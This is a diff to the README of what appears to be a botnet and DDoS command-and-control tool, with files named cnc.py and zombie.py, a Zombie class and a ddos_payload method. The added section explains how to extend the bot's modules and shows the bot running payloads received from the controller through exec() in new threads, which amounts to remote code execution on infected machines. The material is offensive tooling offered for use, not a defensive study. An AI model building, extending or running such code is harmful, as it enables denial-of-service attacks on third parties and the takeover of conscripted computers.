@@ -63,6 +63,7 @@ chmod +x ./script/*.sh
 
 1. Create your method with the template (*#1*)
 2. You need to add your method in class `Zombie` (**cnc.py** / *#2*)
+3. If you whant to add module (no pypi) you need to follow *#3* in **zombie.py**
 
 
 - #1:
@@ -94,6 +95,14 @@ def ddos_payload(self, ip: str, port: str, timeout: str, type: str):
         
     self.send(f'run|{payload}')
 ```
+ 
+ - #3
+ ```py
+ # Just look for this line
+ # add: 'module_name': module_name
+ # Ex: 'random': random
+ threading.Thread(target= exec, args=(payload, {'threading': threading, 'socket': socket, 'time': time, 'module_name': module_name})).start()
+ ```
  
 <br>
 
